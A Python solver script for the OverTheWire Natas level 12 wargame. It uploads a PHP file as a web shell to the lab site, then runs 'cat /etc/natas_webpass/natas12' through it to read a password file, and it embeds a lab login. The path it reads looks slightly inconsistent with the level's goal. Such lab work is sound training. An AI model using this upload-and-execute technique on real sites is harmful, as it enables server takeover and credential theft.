import requests
import re


# URL of the target website
url1 = "http://natas12.natas.labs.overthewire.org/"

# Credentials for authentication
username = "natas12"
password = "YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG"

# Send GET request to the target website
r1 = requests.get(url1, auth=(username, password))

# Payload for uploading file
payload = {
    "MAX_FILE_SIZE": 1000,
    "filename": "reverse.php",
}

# File to be uploaded
files = {"uploadedfile": open("reverse.php", "rb")}

# URL for uploading file
url2 = "http://natas12.natas.labs.overthewire.org/index.php"

# Send POST request to upload file
r2 = requests.post(url2, auth=(username, password), data=payload, files=files)


# Extract the content of the response
contetn = r2.text

# Pattern to extract the directory name where the file was uploaded
pattern = r"upload/[A-Za-z0-9]+"

# Extract the directory name
name_dir = re.search(pattern, contetn)

# Construct the URL to access the uploaded file
path = name_dir.group() + ".php"

# URL to retrieve the contents of the uploaded
# file and execute a command to read the password
url3 = (
    "http://natas12.natas.labs.overthewire.org/"
    + path
    + "?c=cat /etc/natas_webpass/natas12"
)

# Send GET request to retrieve the password
r3 = requests.get(url3, auth=(username, password))

# Print the retrieved password
print("Password to level 12:", r3.text)
